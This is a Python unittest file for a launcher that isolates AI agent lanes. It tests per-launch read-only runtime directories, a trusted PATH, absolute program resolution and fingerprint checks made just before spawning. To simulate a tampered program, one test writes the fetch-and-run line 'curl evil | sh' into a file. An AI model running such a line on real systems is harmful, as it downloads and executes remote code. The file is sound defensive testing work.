"""PAPI-90 item 3: a fresh runtime per launch, and no shared mutable PATH.

Two shared surfaces used to sit between lanes. One capability shim was written
once per broker and put on the front of every lane's ``PATH``, so a lane that
could write to it decided what the next lane ran. And a child inherited the
operator's ``PATH``, so which file ``claude`` or ``make`` meant was decided by
whatever directories the operator happened to have.

So: one runtime directory per launch, made read-only once built; a child
``PATH`` of that directory plus a short trusted system list; and every
configured program resolved to an absolute path, checked, fingerprinted, and
re-checked immediately before the spawn.
"""
from __future__ import annotations

import inspect
import os
import stat
import tempfile
import unittest
from pathlib import Path

from _support import (
    HEAD_A,
    lane_bin,
    make_broker,
    make_config,
    make_source_repo,
    parent_env,
)

from pr_prover.capabilities import SHIM_NAME
from pr_prover.commands import CommandResult
from pr_prover.errors import LaunchPolicyError
from pr_prover.launchers import AgentSpec, BoundContext, LaunchBroker
from pr_prover.runtime import (
    TRUSTED_SYSTEM_PATH,
    Fingerprint,
    LaneRuntime,
    resolution_path,
    resolve_program,
)

BOUND = BoundContext(repo="example/repo", pr=7, branch="feat/example", base="main", head=HEAD_A)
AGENT = AgentSpec(program="claude", model="opus", tools=("Bash", "TodoWrite"))


def executable(path: Path, mode: int = 0o700) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    path.chmod(mode)
    return path


class LaneRuntimeTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.tmp = Path(self._tmp.name)
        self.root = self.tmp / "runtime"

    def make(self, label: str = "lane-a", sequence: int = 1) -> LaneRuntime:
        runtime = LaneRuntime(self.root, label=label, sequence=sequence)
        self.addCleanup(runtime.release)
        return runtime

    def test_a_runtime_carries_its_own_copy_of_the_shim(self) -> None:
        runtime = self.make()
        self.assertEqual(runtime.shim.name, SHIM_NAME)
        self.assertTrue(runtime.shim.is_file())

    def test_two_launches_never_share_a_runtime(self) -> None:
        first = self.make("lane-a", 1)
        second = self.make("lane-a", 2)
        self.assertNotEqual(first.directory, second.directory)
        self.assertNotEqual(first.shim, second.shim)

    def test_a_runtime_directory_that_already_exists_fails_closed(self) -> None:
        """Former-red: an existing path is another lane's runtime, not this one's."""
        self.make("lane-a", 1)
        with self.assertRaises(LaunchPolicyError) as caught:
            LaneRuntime(self.root, label="lane-a", sequence=1)
        self.assertIn("already exists", caught.exception.message)

    def test_a_built_runtime_is_not_writable(self) -> None:
        runtime = self.make()
        for path in (runtime.shim, runtime.bin, runtime.directory):
            mode = path.stat().st_mode
            self.assertFalse(mode & stat.S_IWUSR, path)
            self.assertFalse(mode & (stat.S_IWGRP | stat.S_IWOTH), path)

    def test_the_child_path_is_this_runtime_then_trusted_system_paths(self) -> None:
        runtime = self.make()
        entries = runtime.child_path().split(os.pathsep)
        self.assertEqual(entries[0], str(runtime.bin))
        self.assertEqual(entries[1:], list(TRUSTED_SYSTEM_PATH))

    def test_an_intact_runtime_passes_its_own_check(self) -> None:
        self.make().assert_intact()

    def test_a_runtime_reopened_for_writing_fails_closed(self) -> None:
        """Former-red: a lane that could rewrite the shim decides what runs next."""
        runtime = self.make()
        runtime.bin.chmod(0o700)
        runtime.shim.chmod(0o700)
        with self.assertRaises(LaunchPolicyError) as caught:
            runtime.assert_intact()
        self.assertIn("writable", caught.exception.message)

    def test_a_missing_shim_fails_closed(self) -> None:
        runtime = self.make()
        runtime.bin.chmod(0o700)
        runtime.shim.chmod(0o700)
        runtime.shim.unlink()
        with self.assertRaises(LaunchPolicyError) as caught:
            runtime.assert_intact()
        self.assertIn("missing", caught.exception.message)

    def test_a_shim_replaced_by_a_symlink_fails_closed(self) -> None:
        runtime = self.make()
        runtime.bin.chmod(0o700)
        runtime.shim.chmod(0o700)
        runtime.shim.unlink()
        runtime.shim.symlink_to(executable(self.tmp / "evil"))
        with self.assertRaises(LaunchPolicyError) as caught:
            runtime.assert_intact()
        self.assertIn("symbolic link", caught.exception.message)

    def test_release_gives_the_write_bits_back_so_scratch_can_be_removed(self) -> None:
        runtime = self.make()
        runtime.release()
        self.assertTrue(runtime.bin.stat().st_mode & stat.S_IWUSR)


class ResolveProgramTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.tmp = Path(self._tmp.name)
        self.bin = self.tmp / "bin"
        self.program = executable(self.bin / "lane-tool")

    def resolve(self, name: str, **kwargs: object):  # type: ignore[no-untyped-def]
        kwargs.setdefault("search_path", str(self.bin))
        kwargs.setdefault("what", "lane")
        return resolve_program(name, **kwargs)  # type: ignore[arg-type]

    def test_a_bare_name_resolves_to_an_absolute_path(self) -> None:
        resolved = self.resolve("lane-tool")
        self.assertEqual(resolved.path, str(self.program.resolve()))
        self.assertTrue(Path(resolved.path).is_absolute())

    def test_a_symbolic_link_resolves_to_what_will_actually_run(self) -> None:
        link = self.bin / "aliased"
        link.symlink_to(self.program)
        self.assertEqual(self.resolve("aliased").path, str(self.program.resolve()))

    def test_a_relative_path_resolves_against_the_lane_working_directory(self) -> None:
        gate = executable(self.tmp / "work" / "scripts" / "gate.sh")
        resolved = self.resolve("./scripts/gate.sh", base=self.tmp / "work")
        self.assertEqual(resolved.path, str(gate.resolve()))

    def test_a_relative_path_with_no_working_directory_fails_closed(self) -> None:
        with self.assertRaises(LaunchPolicyError):
            self.resolve("./scripts/gate.sh", base=None)

    def test_a_program_that_is_not_on_the_search_path_fails_closed(self) -> None:
        with self.assertRaises(LaunchPolicyError) as caught:
            self.resolve("absent-tool")
        self.assertIn("trusted search path", caught.exception.message)

    def test_a_directory_is_not_a_program(self) -> None:
        """A bare name never resolves to one; a configured path is refused outright."""
        directory = self.bin / "adirectory"
        directory.mkdir()
        with self.assertRaises(LaunchPolicyError) as caught:
            self.resolve("adirectory")
        self.assertIn("trusted search path", caught.exception.message)
        with self.assertRaises(LaunchPolicyError) as caught:
            self.resolve(str(directory))
        self.assertIn("regular file", caught.exception.message)

    def test_a_non_executable_file_fails_closed(self) -> None:
        plain = self.bin / "not-executable"
        plain.write_text("data\n", encoding="utf-8")
        plain.chmod(0o600)
        with self.assertRaises(LaunchPolicyError) as caught:
            self.resolve("not-executable")
        self.assertIn("trusted search path", caught.exception.message)
        with self.assertRaises(LaunchPolicyError) as caught:
            self.resolve(str(plain))
        self.assertIn("not executable", caught.exception.message)

    def test_a_group_or_world_writable_program_fails_closed(self) -> None:
        """Former-red: another process could replace what this lane runs."""
        for mode in (0o770, 0o707):
            with self.subTest(mode=oct(mode)):
                executable(self.bin / "loose", mode)
                with self.assertRaises(LaunchPolicyError) as caught:
                    self.resolve("loose")
                self.assertIn("writable by group or world", caught.exception.message)

    def test_a_program_reached_through_a_writable_directory_fails_closed(self) -> None:
        loose = self.tmp / "loose-dir"
        executable(loose / "tool")
        loose.chmod(0o777)
        self.addCleanup(loose.chmod, 0o700)
        with self.assertRaises(LaunchPolicyError) as caught:
            self.resolve("tool", search_path=str(loose))
        self.assertIn("another user can write to", caught.exception.message)

    def test_a_sticky_directory_is_still_trusted(self) -> None:
        """/tmp is world-writable but sticky: only the owner may replace a file."""
        sticky = self.tmp / "sticky"
        executable(sticky / "tool")
        sticky.chmod(0o1777)
        self.addCleanup(sticky.chmod, 0o700)
        self.assertTrue(self.resolve("tool", search_path=str(sticky)).path.endswith("tool"))

    def test_a_program_inside_a_lane_runtime_fails_closed(self) -> None:
        """Former-red: a lane cannot be handed a program another lane could write."""
        runtime_root = self.tmp / "runtime"
        runtime = LaneRuntime(runtime_root, label="lane-a", sequence=1)
        self.addCleanup(runtime.release)
        with self.assertRaises(LaunchPolicyError) as caught:
            self.resolve(
                str(runtime.shim),
                forbidden_roots=(runtime_root,),
            )
        self.assertIn("launcher-owned lane runtime", caught.exception.message)

    def test_the_capability_shim_is_not_a_lanes_command_line(self) -> None:
        shim = executable(self.bin / SHIM_NAME)
        self.assertTrue(shim.exists())
        with self.assertRaises(LaunchPolicyError) as caught:
            self.resolve(SHIM_NAME)
        self.assertIn("capability shim", caught.exception.message)

    def test_a_padded_or_empty_program_name_fails_closed(self) -> None:
        for name in ("", " lane-tool", "lane-tool "):
            with self.subTest(name=repr(name)), self.assertRaises(LaunchPolicyError):
                self.resolve(name)

    def test_the_resolution_path_appends_trusted_system_directories(self) -> None:
        entries = resolution_path("/opt/custom/bin").split(os.pathsep)
        self.assertEqual(entries[0], "/opt/custom/bin")
        for trusted in TRUSTED_SYSTEM_PATH:
            self.assertIn(trusted, entries)

    def test_resolution_still_works_with_no_parent_path_at_all(self) -> None:
        self.assertIn("/usr/bin", resolution_path(None).split(os.pathsep))


class FingerprintTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.tmp = Path(self._tmp.name)
        self.program = executable(self.tmp / "bin" / "lane-tool")

    def test_an_unchanged_program_passes(self) -> None:
        Fingerprint.of(self.program).assert_unchanged(what="lane")

    def test_a_program_replaced_after_validation_fails_closed(self) -> None:
        """Former-red: integrity has to hold across validation to spawn."""
        recorded = Fingerprint.of(self.program)
        self.program.write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")
        with self.assertRaises(LaunchPolicyError) as caught:
            recorded.assert_unchanged(what="lane")
        self.assertIn("changed between validation and launch", caught.exception.message)

    def test_a_program_swapped_for_a_different_inode_fails_closed(self) -> None:
        recorded = Fingerprint.of(self.program)
        replacement = executable(self.tmp / "bin" / "other")
        self.program.unlink()
        os.link(replacement, self.program)
        with self.assertRaises(LaunchPolicyError):
            recorded.assert_unchanged(what="lane")

    def test_a_program_that_vanished_fails_closed(self) -> None:
        recorded = Fingerprint.of(self.program)
        self.program.unlink()
        with self.assertRaises(LaunchPolicyError) as caught:
            recorded.assert_unchanged(what="lane")
        self.assertIn("no longer readable", caught.exception.message)

    def test_a_mode_change_alone_is_enough_to_fail(self) -> None:
        recorded = Fingerprint.of(self.program)
        self.program.chmod(0o755)
        with self.assertRaises(LaunchPolicyError):
            recorded.assert_unchanged(what="lane")


class RecordingRunner:
    """Records what the launcher would have spawned, and spawns nothing."""

    def __init__(self) -> None:
        self.calls: list[tuple[str, ...]] = []

    def run(self, argv, *, cwd=None, env=None, timeout=None):  # type: ignore[no-untyped-def]
        self.calls.append(tuple(argv))
        return CommandResult(argv=tuple(argv), returncode=0, stdout="done\n", stderr="")


class LaunchIntegrityTests(unittest.TestCase):
    """The launcher's own use of all of the above."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.tmp = Path(self._tmp.name)
        self.config = make_config(self.tmp, source_repo=make_source_repo(self.tmp))
        self.worktree = self.config.worktree_root / "attempt1"
        self.worktree.mkdir(parents=True)
        self.lane_bin = lane_bin(self.tmp)
        self.runner = RecordingRunner()
        self.broker = make_broker(
            self.config,
            self.runner,
            scratch_root=self.tmp,
            env=parent_env(PATH=f"{self.lane_bin}:/usr/bin:/bin"),
        )
        self.addCleanup(self.broker.close)

    def run_reviewer(self, **overrides: object) -> None:
        arguments: dict = {
            "role": "A", "identity": "reviewer", "agent": AGENT, "argv": None,
            "bound": BOUND, "cwd": self.worktree, "timeout": None,
        }
        arguments.update(overrides)
        self.broker.run_reviewer(**arguments)  # type: ignore[arg-type]

    def test_a_lane_is_launched_from_a_resolved_absolute_path(self) -> None:
        self.run_reviewer()
        self.assertEqual(
            self.runner.calls[-1][0], str((self.lane_bin / "claude").resolve())
        )

    def test_an_agent_program_that_is_not_resolvable_fails_closed(self) -> None:
        with self.assertRaises(LaunchPolicyError):
            self.run_reviewer(
                agent=AgentSpec(program="no-such-agent", model="opus", tools=("Bash",))
            )
        self.assertEqual(self.runner.calls, [])

    def test_the_last_thing_before_a_spawn_is_the_integrity_re_check(self) -> None:
        """The window between validating a launch and performing it is closed.

        Every check the launcher makes happens at some earlier moment; the
        runtime, the program, and the settings file all have to still be what
        they were by the time the child is actually started. This asserts the
        ordering structurally, because the window itself is too narrow to race
        from a test without a seam that would only exist for the test.
        """
        source = inspect.getsource(LaunchBroker._launch)
        for call in ("runtime.assert_intact()", "program.assert_unchanged", "assert_sandbox_file"):
            self.assertIn(call, source)
        self.assertLess(
            max(source.index(call) for call in
                ("runtime.assert_intact()", "program.assert_unchanged", "assert_sandbox_file")),
            source.index("self._runner.run("),
        )

    def test_every_lane_runtime_is_gone_once_the_broker_closes(self) -> None:
        self.run_reviewer()
        scratch = list(self.tmp.glob("pr-prover-launch-*"))
        self.assertEqual(len(scratch), 1)
        lanes = list((scratch[0] / "lanes").iterdir())
        self.assertTrue(lanes)
        for lane in lanes:
            self.assertTrue((lane / "runtime").is_dir())
        self.broker.close()
        self.assertFalse(scratch[0].exists())


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
